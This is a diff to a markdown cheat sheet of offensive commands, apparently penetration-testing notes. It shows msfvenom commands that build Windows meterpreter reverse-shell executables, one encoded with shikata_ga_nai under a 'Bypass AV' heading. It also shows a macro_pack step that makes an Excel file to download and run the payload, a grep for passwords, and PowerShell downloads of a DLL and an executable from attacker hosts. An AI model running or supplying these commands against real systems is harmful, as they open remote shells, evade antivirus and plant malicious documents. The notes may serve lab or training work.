@@ -84,10 +84,14 @@ Create payload with msfvenom
 - `msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=<Host_ip> LPORT=1234 -f exe > payload.exe` -> Host the payload
   - `echo "http:\\Host_ip\payload.exe" "payload.exe" | .\marco_pack.exe -o -G "sheet.xls"` -> Generate the document to download payload and execute it
 
-## Bypass AV
+### Bypass AV
 
 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.101 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 > rTCPenc.exe`
 
-## Download from windows
+### Grep
 
-`iwr -UseBasicParsing -Uri http://<Your-IP>/Dwrite.dll -OutFile .\Dwrite.dll`
+`grep -nr "password"` Looking for keyword.
+
+### Download file from windows
+
+`iwr -UseBasicParsing -Uri http://10.10.31.2/program.exe -OutFile ‘C:\Users\student\Desktop\tool\program.exe’`
